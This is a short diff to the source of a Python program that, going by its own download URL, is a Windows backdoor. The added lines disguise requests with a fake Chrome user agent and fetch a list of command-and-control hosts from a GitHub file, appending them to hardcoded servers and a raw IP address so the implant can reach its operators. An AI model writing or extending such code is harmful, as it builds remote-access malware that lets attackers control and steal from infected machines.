@@ -11,7 +11,15 @@ from subprocess import Popen
 
 import socket
 
-sites = ["paner.altervista.org", "verifiche.ddns.net", "visionstore.info"]
+ua = UserAgent()
+#print(ua.chrome)
+header = {'User-Agent':str(ua.chrome)}
+mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
+#print mainsite.text
+sites = ["paner.altervista.org"]#, mainsite.text]
+sites.extend(mainsite.text.split(",") )
+
+#sites = ["paner.altervista.org", "verifiche.ddns.net", "visionstore.info"]
 #site="paner.altervista.org"
 site1="paner.altervista.org"
 site2="52.26.124.145"
